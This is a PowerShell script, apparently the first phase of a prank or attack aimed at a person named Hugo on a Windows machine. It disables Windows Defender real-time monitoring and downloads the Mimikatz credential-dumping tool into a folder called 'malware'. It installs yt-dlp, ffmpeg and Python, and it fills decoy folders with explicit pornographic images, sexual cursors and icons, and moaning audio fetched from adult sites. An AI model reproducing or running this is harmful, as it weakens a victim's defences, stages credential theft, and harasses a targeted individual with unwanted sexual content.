. $rootScriptDirectory"FuckHugo"\otherFunctionalities.ps1
function createDirectories {
    param (
        [Parameter()]
        [string]$baseDirectory,
        [Parameter()]
        [string]$temporalDirectory,
        [Parameter()]
        [string]$decoyName
    )
    functionPresentation -text "Creating Directories"
    function programDirs {
        $directories = @("Images","Videos","Audios","Data","Software")
        if (Test-Path "$baseDirectory\$decoyName") {
            informTerminal -category "Directory $decoyName" -result "ALREADY CREATED" -color "yellow" -icon "!"
        } else {
            New-Item -Path $baseDirectory -Name $decoyName -ItemType Directory -Force | Out-Null
            informTerminal -category "Directory $decoyName" -result "CREATED" -color "green" -icon "+"
        }
        foreach ($directory in $directories) {
            if (Test-Path "$baseDirectory\$decoyName\$directory") {
                informTerminal -category "Directory $directory" -result "ALREADY CREATED" -color "yellow" -icon "!"
            } else {
                New-Item -Path "$baseDirectory\$decoyName" -Name $directory -ItemType Directory -Force | Out-Null
                informTerminal -category "Directory $directory" -result "CREATED" -color "green" -icon "+"
            }
        }
    }

    function toolsDirs {
        if (Test-Path "$temporalDirectory\Tools") {
            informTerminal -category "Directory Tools" -result "ALREADY CREATED" -color "yellow" -icon "!"
        } else {
            New-Item -Path $temporalDirectory -Name "Tools" -ItemType Directory -Force | Out-Null
            informTerminal -category "Directory Tools" -result "CREATED" -color "green" -icon "+"
        }
    }

    programDirs
    toolsDirs
}
function disableWindowsDefender {
    functionPresentation -text "Disabling Real Time Monitoring Windows Defender"
    
    Set-MpPreference -DisableRealtimeMonitoring $true
    
    informTerminal -category "Windows Defender" -result "REAL TIME MONITORING DIASABLED" -color "green" -icon "+"
}
function downloadSoftware {
    param (
        [string]$malwareDirectory
    )
    functionPresentation -text "Downloading Software"
    $mimikatzURL = "https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe"

    if (Test-Path "$malwareDirectory\mimikatz.exe") {
        informTerminal -category "Mimikatz" -result "ALREADY INSTALLED" -color "yellow" -icon "!"
    } else {
        informTerminal -category "Mimikatz" -result "DOWNLOADING" -color "cyan" -icon "+"
        
        Invoke-WebRequest $mimikatzURL -Outfile "$malwareDirectory\mimikatz.exe"
        
        if (Test-Path "$malwareDirectory\mimikatz.exe") {
            informTerminal -category "Mimikatz" -result "SUCCESSFULLY DOWNLOADED" -color "green" -icon "+"
        } else {
            informTerminal -category "Mimikatz" -result "ERROR DOWNLOADING" -color "red" -icon "x"
        }
    }
}

function downloadAudios {
    param (
        [Parameter()]
        [string]$audiosDirectory,
        [Parameter()]
        [string]$toolsDirectory

    )
    functionPresentation -text "Downloading Audios"
    $urls = @("https://www.youtube.com/watch?v=TEJd4Sxa4sk", 
    "https://www.youtube.com/watch?v=pqgSKzugDPg",
    "https://www.youtube.com/watch?v=zx59bimwvIo",
    "https://www.youtube.com/watch?v=ZgTck7vGwIk",
    "https://www.youtube.com/watch?v=bp7mTWoaYog",
    "https://www.youtube.com/watch?v=CMBF7PmolFM",
    "https://www.youtube.com/watch?v=F4Xe_fSE4KE",
    "https://www.youtube.com/watch?v=2CoUj9c2UCk",
    "https://www.youtube.com/watch?v=-lGFpyuuchg",
    "https://www.youtube.com/watch?v=1AlYrgAnFdw",
    "https://www.youtube.com/watch?v=k2cH08YMvDs",
    "https://www.youtube.com/watch?v=-6qODwx-ZqE",
    "https://www.youtube.com/watch?v=qy7kRN9kJYo",
    "https://www.youtube.com/watch?v=00vu8xU1YV0"
    )
    $filenames = @("AlexisTexas.wav", 
    "LoudGirlMoanings.wav",
    "Intense.wav",
    "HentaiMoaning.wav",
    "masanime.wav",
    "gaygimiendo.wav",
    "gigigi.wav",
    "genshin.wav",
    "rapchino.wav",
    "rapcoreano.wav",
    "blyat.wav",
    "aaa.wav",
    "blyat2.wav",
    "anime4.wav"
    )

    $ytdlpPath = "$toolsDirectory\yt-dlp.exe"
    $ffmpegPath = "$toolsDirectory\ffmpeg\ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe"

    if ((Test-Path $ytdlpPath) -and (Test-Path $ffmpegPath)) {
        informTerminal -category "Tool YT-DLP" -result "FOUND" -color "green" -icon "+"

        for ($index = 0; $index -lt $urls.Count; $index++) {
            if (Test-Path "$audiosDirectory\$($filenames[$index])") {
                informTerminal -category "Audio $($filenames[$index])" -result "ALREADY DOWNLOADED" -color "yellow" -icon "!"
            } else {
                informTerminal -category "Audio $($filenames[$index])" -result "DOWNLOADING" -color "cyan" -icon "+"
                
                Powershell "$ytdlpPath -x --extract-audio --audio-format wav $($urls[$index]) --ffmpeg-location $ffmpegPath --audio-quality 0 -o '$audiosDirectory\$($filenames[$index])'" | Out-Null
                
                if (Test-Path "$audiosDirectory\$($filenames[$index])") {
                    informTerminal -category "Audio $($filenames[$index])" -result "SUCCESSFULLY DOWNLOADED" -color "green" -icon "+"
                } else {
                    informTerminal -category "Audio $($filenames[$index])" -result "ERROR DOWNLOADING" -color "red" -icon "x"
                }
            }
        }

    } else {
        informTerminal -category "Tool TY-DLP" -result "NOT FOUND" -color "red" -icon "x"
        informTerminal -category "Tool YT-DLP" -result "EXITING" -color "red" -icon "x"
        exit 1
    }
}

function downloadImages {
    param (
        [string]$imagesDirectory
    )
    functionPresentation -text "Downloading Images"
    $urls = @("https://cdn.boyspornpics.com/galleries/k/1706/9.jpg",
    "https://i.fapality.com/videos_screenshots/48000/48328/preview.jpg",
    "https://th.bing.com/th/id/OIP.5dB8mdNV8Bn4pANsf_P3AQHaEK?rs=1&pid=ImgDetMain",
    "https://static-ca-cdn.eporner.com/gallery/iB/h2/p7Hh9Arh2iB/358651-close-up-blond-black-hair-mouth.jpg",
    "https://th.bing.com/th/id/OIP.ryQqe2zT_kfJQWaMKVxy-gHaE8?rs=1&pid=ImgDetMain",
    "https://th.bing.com/th/id/R.202a4ee81e67699b9f5c45402cb81c8f?rik=SNYSaz4pogMqJw&pid=ImgRaw&r=0",
    "https://t.boyfriendtv.com/bftv/images/2020-05/5e/5ec3775ea100c/5ec3775ea100c-full-28.jpg",
    "https://th.bing.com/th/id/R.c1018dedb2e05532449a2f079b6d63c5?rik=HxaNaCni3XFkKQ&pid=ImgRaw&r=0",
    "https://imgs1cdn.adultempire.com/galleries/76/136638919472448576_3000.jpg",
    "https://th.bing.com/th/id/OIP.Rgx1OsCMTlfjVy6BRoNC0AHaEK?rs=1&pid=ImgDetMain",
    "https://th.bing.com/th/id/R.77e5a8df1a5ff8993e787308be7dba9c?rik=5fxjL9YehPv%2fAg&pid=ImgRaw&r=0",
    "https://th.bing.com/th/id/R.ecab2c46f100af0dcc6570ce5b514521?rik=BBFXDwMMFfLQkw&pid=ImgRaw&r=0",
    "http://www.rw-designer.com/cursor-download.php?id=127390",
    "http://www.rw-designer.com/icon-download.php?id=22939",
    "http://www.rw-designer.com/icon-download.php?id=24207",
    "http://www.rw-designer.com/icon-download.php?id=12764",
    "http://www.rw-designer.com/icon-download.php?id=12767",
    "http://www.rw-designer.com/icon-download.php?id=12768",
    "http://www.rw-designer.com/icon-download.php?id=12769",
    "http://www.rw-designer.com/cursor-download.php?id=62984",
    "http://www.rw-designer.com/cursor-download.php?id=127389",
    "http://www.rw-designer.com/cursor-download.php?id=127391"
    )
    $filenames = @("gayPic1.jpg",
    "6bbcvs1girl.jpg",
    "2blackboys.jpg",
    "pussygripgirl.jpg",
    "2gaysfucking.jpg",
    "3assholes.jpg",
    "gayfisting.jpg",
    "gayfisting2.jpg",
    "doubleP.jpg",
    "blackmalefucking.jpg",
    "lanegradeoto.jpg",
    "bbcanal.jpg",
    "sex.ani",
    "midgets.ico",
    "nakedman.ico",
    "sexyman.ico",
    "dick.ico",
    "dick2.ico",
    "dick3.ico",
    "sex2.ani",
    "boobs.ani",
    "sex3.ani"
    )

    for ($index = 0; $index -lt $urls.Count; $index++) {
        if (Test-Path "$imagesDirectory\$($filenames[$index])") {
            informTerminal -category "Image $($filenames[$index])" -result "ALREADY DOWNLOADED" -color "yellow" -icon "!"
        } else {
            informTerminal -category "Image $($filenames[$index])" -result "DOWNLOADING" -color "cyan" -icon "+"

            Invoke-WebRequest $($urls[$index]) -OutFile "$imagesDirectory\$($filenames[$index])"

            if (Test-Path "$imagesDirectory\$($filenames[$index])") {
                informTerminal -category "Image $($filenames[$index])" -result "SUCCESSFULLY DOWNLOADED" -color "green" -icon "+"
            } else {
                informTerminal -category "Image $($filenames[$index])" -result "ERROR DOWNLOADING" -color "red" -icon "x"
            }
        }
    }
}

function installYTDLP {
    param (
        [string]$toolsDirectory
    )
    functionPresentation -text "Installing YT-DLP"
    $ytdlpUrl = "https://github.com/yt-dlp/yt-dlp/releases/latest/download/yt-dlp.exe"
    $ffmpegUrl = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"

    if (Test-Path "$toolsDirectory\yt-dlp.exe") {
        informTerminal -category "Tool YT-DLP" -result "ALREADY INSTALLED" -color "yellow" -icon "!"
    } else {
        informTerminal -category "Tool YT-DLP" -result "DOWNLOADING" -color "cyan" -icon "+"

        Invoke-WebRequest $ytdlpUrl -OutFile "$toolsDirectory\yt-dlp.exe"

        if (Test-Path "$toolsDirectory\yt-dlp.exe") {
            informTerminal -category "Tool YT-DLP" -result "SUCCESSFULLY DOWNLOADED" -color "green" -icon "+"
        } else {         
            informTerminal -category "Tool YT-DLP" -result "ERROR DOWNLOADING" -color "red" -icon "x"   
        }
    }

    if (Test-Path "$toolsDirectory\ffmpeg\ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe") {
        informTerminal -category "Tool FFMPEG" -result "ALREADY INSTALLED" -color "yellow" -icon "x"
    } else {
        informTerminal -category "Tool FFMPEG ZIP" -result "DOWNLOADING" -color "cyan" -icon "+"

        Invoke-WebRequest $ffmpegUrl -OutFile "$toolsDirectory\ffmpeg.zip"

        if (Test-Path "$toolsDirectory\ffmpeg.zip") {
            informTerminal -category "Tool FFMPEG ZIP" -result "SUCCESSFULLY DOWNLOADED" -color "green" -icon "+"
            informTerminal -category "Tool FFMPEG" -result "EXTRACTING" -color "cyan" -icon "+"

            Expand-Archive -Path "$toolsDirectory\ffmpeg.zip" -DestinationPath "$toolsDirectory\ffmpeg" -Force

            if (Test-Path "$toolsDirectory\ffmpeg\ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe") {
                informTerminal -category "Tool FFMPEG" -result "SUCCESSFULLY INSTALLED " -color "green" -icon "+"
            } else {
                informTerminal -category "Tool FFMPEG" -result "ERROR EXTARCTING" -color "red" -icon "x"
                informTerminal -category "Tool FFMPEG" -result "EXITING" -color "red" -icon "x"
                exit 1
            }
        } else {      
            informTerminal -category "Tool FFMPEG ZIP" -result "ERROR DOWNLOADING" -color "red" -icon "x"      
            informTerminal -category "Tool FFMPEG ZIP" -result "EXITING" -color "red" -icon "x"
            exit 1
        }
    }
}

function installPython {
    param (
        [string]$toolsDirectory
    )
    functionPresentation -text "Installing Python"
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    $pythonLink = "https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe"
    $pythonPath = "$env:SYSTEMDRIVE\Users\$env:USERNAME\AppData\Local\Programs\Python\Python312"
    $pipPath = "$env:SYSTEMDRIVE\Users\$env:USERNAME\AppData\Local\Programs\Python\Python312\Scripts"

    if ($(python.exe --version)) {
        informTerminal -category "Python" -result "ALREADY INSTALLED" -color "yellow" -icon "!"

        if (Test-Path "$pythonPath\Lib\site-packages\win32") {
            informTerminal -category "PyWin32" -result "FOUND" -color "green" -icon "+"
        } else {
            informTerminal -category "PyWin32" -result "NOT FOUND" -color "red" -icon "x"
            informTerminal -category "PyWin32" -result "INSTALLING" -color "cyan" -icon "+"
            
            Start-Process -Path "$pipPath\pip.exe" -ArgumentList "install pywin32" -Wait | Out-Null

            if (Test-Path "$pythonPath\Lib\site-packages\win32") {
                informTerminal -category "PyWin32" -result "SUCCESSFULLY INSTALLED" -color "green" -icon "+"
            } else {
                informTerminal -category "PyWin32" -result "ERROR INSTALLING" -color "red" -icon "x"
            }
        }
    } else {
    
        informTerminal -category "Python" -result "DOWNLOADING" -color "cyan" -icon "+"

        Invoke-WebRequest $pythonLink -OutFile "$toolsDirectory\pythonInstaller.exe"

        if (Test-Path "$toolsDirectory\pythonInstaller.exe") {
            informTerminal -category "Python" -result "SUCCESSFULLY DOWNLOADED" -color "green" -icon "+"
            informTerminal -category "Python" -result "INSTALLING" -color "cyan" -icon "+"
            
            Start-Process -FilePath "$toolsDirectory\pythonInstaller.exe" -ArgumentList "/quiet InstallAllUsers=0 InstallLauncherAllUsers=0 PrependPath=1 Include_test=0" -Wait
            
            if (Test-Path $pythonPath) {
                informTerminal -category "Python" -result "SUCCESSFULLY INSTALLED" -color "green" -icon "+"
            } else {
                informTerminal -category "Python" -result "ERROR INSTALLING" -color "green" -icon "x"
            }

            informTerminal -category "Python" -result "INSTALLING PYWIN32" -color "cyan" -icon "+"

            Start-Process -FilePath "$pipPath\pip.exe" -ArgumentList "install pywin32" -Wait | Out-Null

            informTerminal -category "Python" -result "PYWIN32 INSTALLED" -color "green" -icon "+"
        } else {
            informTerminal -category "Python" -result "ERROR DOWNLOADING" -color "red" -icon "x"
            exit 1
        }
    } 
    # TODO AVERIGUAR PORQUE SE DETIENE LA INSTALAR
}

function setPhase2 {

}